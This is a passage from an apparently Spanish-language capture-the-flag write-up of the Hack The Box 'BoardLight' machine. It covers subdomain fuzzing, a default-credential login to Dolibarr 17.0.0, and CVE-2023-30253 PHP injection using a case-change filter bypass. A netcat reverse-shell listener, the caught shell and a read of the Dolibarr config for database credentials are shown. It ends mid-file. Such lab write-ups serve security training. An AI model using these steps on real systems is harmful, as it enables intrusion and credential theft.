+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET        3l       10w      667c http://board.htb/images/telephone-white.png
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;      GET        1l        3w       16c http://board.htb/portfolio.php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET        5l       12w      847c http://board.htb/images/envelope-white.png
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET      294l      635w     9426c http://board.htb/contact.php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET      294l      633w     9209c http://board.htb/do.php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET      517l     1053w    15949c http://board.htb/index.php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET      714l     1381w    13685c http://board.htb/css/style.css
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET      536l     2364w   201645c http://board.htb/images/who-img.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET        2l     1276w    88145c http://board.htb/js/jquery-3.4.1.min.js
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET      348l     2369w   178082c http://board.htb/images/map-img.png
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET     4437l    10973w   131639c http://board.htb/js/bootstrap.js
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET    10038l    19587w   192348c http://board.htb/css/bootstrap.css
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET      517l     1053w    15949c http://board.htb/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;subdomain-discovery&#34;&gt;Subdomain Discovery&lt;/h3&gt;
+&lt;p&gt;Tras ejecutar &lt;code&gt;ffuf&lt;/code&gt; este muestra el subdominio &lt;code&gt;crm&lt;/code&gt; el cual agregamos a /etc/hosts.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kali@kali&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/dev/pts/8&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/boardlight&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Host: FUZZ.board.htb&amp;#34;&lt;/span&gt; -u http://board.htb -fl &lt;span class=&#34;m&#34;&gt;518&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        /&lt;span class=&#34;s1&#34;&gt;&amp;#39;___\  /&amp;#39;&lt;/span&gt;___&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;          /&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;___&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;      
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_/ /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_/  __  __  /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_/       
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;,__&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;,__&lt;span class=&#34;se&#34;&gt;\/\ \/\ \ \ \ &lt;/span&gt;,__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;/ &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;/&lt;span class=&#34;se&#34;&gt;\ \ \_\ \ \ \ \_&lt;/span&gt;/      
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         &lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;___/  &lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt;      
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/   &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;___/    &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/       
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       v2.1.0-dev
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;________________________________________________
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; :: Method           : GET
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; :: URL              : http://board.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; :: Header           : Host: FUZZ.board.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; :: Follow redirects : &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; :: Calibration      : &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; :: Timeout          : &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; :: Threads          : &lt;span class=&#34;m&#34;&gt;40&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; :: Filter           : Response lines: &lt;span class=&#34;m&#34;&gt;518&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;________________________________________________
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;crm                     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 83ms&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;:: Progress: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;100000/100000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; :: Job &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1/1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; :: &lt;span class=&#34;m&#34;&gt;392&lt;/span&gt; req/sec :: Duration: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0:03:47&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; :: Errors: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; ::
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;dolibarr---code-injection&#34;&gt;Dolibarr - Code Injection&lt;/h1&gt;
+&lt;p&gt;Al visitar el subdominio observamos el login de Dolibarr 17.0.0.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/boardlight/Screenshot_2024071931036.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Logramos ingresar tras ingresar las credenciales &lt;code&gt;admin:admin&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/boardlight/Screenshot_2024071931029.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Dolibarr tiene una vulnerabilidad (&lt;a href=&#34;https://www.swascan.com/security-advisory-dolibarr-17-0-0/&#34;&gt;CVE-2023-30253&lt;/a&gt;) que permite la inyeccion de codigo PHP al editar y visualizar las paginas. Para ello nos dirigimos a Websites y creamos un nuevo sitio, rellenando el formulario con los valores necesarios.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/boardlight/Screenshot_2024071931059.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Una vez con el sitio creado, nos dirigimos a Pages y creamos una nueva seleccionando la primera opcion (Or create page from scratch or from a page template) rellenando los valores necesarios.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/boardlight/Screenshot_2024071931002.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Finalmente seleccionamos &lt;code&gt;Edit source HTML&lt;/code&gt; lo cual nos lleva a un editor de HTML.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/boardlight/Screenshot_2024071931017.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En este editor es donde realizamos la inyeccion del codigo, en si, codigo PHP no esta permitido o esta deshabilitado, para ello es necesario realizar &amp;ldquo;bypass&amp;rdquo;, en este caso cambiando los caracteres por minusculas o mayusculas (Php, pHp, pHP, PHP).&lt;/p&gt;
+&lt;p&gt;Tras agregar el codigo deseado, en nuestro caso la ejecucion de los comandos &lt;code&gt;id;pwd&lt;/code&gt; damos a guardar.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/boardlight/Screenshot_2024071931057.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;El sitio nos redirigira nuevamente a las propiedades del sitio, en la parte derecha observamos un icono al darle clic nos muestra una pre-visualizacion de la pagina seleccionada.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/boardlight/Screenshot_2024071931011.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Y como podemos observar el codigo PHP con la ejecucion de los dos comandos fue exitoso.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/boardlight/Screenshot_2024071931013.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;user---www-data&#34;&gt;User - www-data&lt;/h1&gt;
+&lt;p&gt;Ejecutamos una shell inversa utilizando &lt;a href=&#34;https://github.com/sckull/shells&#34;&gt;shells&lt;/a&gt; en el sitio.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/boardlight/Screenshot_2024071940513.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Logramos acceder a la maquina como www-data.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kali@kali&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/dev/pts/4&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/boardlight&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; rlwrap nc -lvp &lt;span class=&#34;m&#34;&gt;1335&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1335&lt;/span&gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.10&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from board.htb &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.11.11&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;51398&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t access tty; job control turned off
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;$ which python
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;$ which python3
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;/usr/bin/python3
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;$ python3 -c &amp;#39;&lt;/span&gt;import pty&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;pty.spawn&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;www-data@boardlight:~/html/crm.board.htb/htdocs/website$ whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;id
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;www-data
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;33&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www-data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;33&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www-data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;33&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www-data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;www-data@boardlight:~/html/crm.board.htb/htdocs/website$
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;user---larissa&#34;&gt;User - Larissa&lt;/h1&gt;
+&lt;p&gt;En el archivo de configuracion de dolibarr encontramos las credenciales para la base de datos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;www-data@boardlight:~/html/crm.board.htb/htdocs$ cat conf/conf.php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat conf/conf.php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_url_root&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://crm.board.htb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_document_root&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/var/www/html/crm.board.htb/htdocs&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_url_root_alt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/custom&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_document_root_alt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/var/www/html/crm.board.htb/htdocs/custom&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_data_root&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/var/www/html/crm.board.htb/documents&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_db_host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$dolibarr_main_db_port&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;3306&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
